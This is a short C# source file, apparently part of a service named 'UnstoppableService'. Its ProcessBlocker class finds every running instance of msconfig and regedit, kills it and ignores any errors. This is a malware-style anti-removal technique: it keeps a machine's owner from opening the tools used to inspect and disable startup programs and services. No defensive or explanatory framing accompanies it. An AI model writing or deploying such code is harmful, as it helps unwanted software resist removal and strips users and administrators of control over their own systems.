using System.Diagnostics;

namespace UnstoppableService;

public static class ProcessBlocker
{
    private static readonly string[] BlockedProcesses = { "msconfig", "regedit" };

    public static void TerminateBlockedProcesses()
    {
        foreach (var processName in BlockedProcesses)
        {
            var processes = Process.GetProcessesByName(processName);
            foreach (var process in processes)
            {
                try
                {
                    process.Kill();
                }
                catch (Exception)
                {
                    // Ignore errors if the process has already exited
                }
            }
        }
    }
}
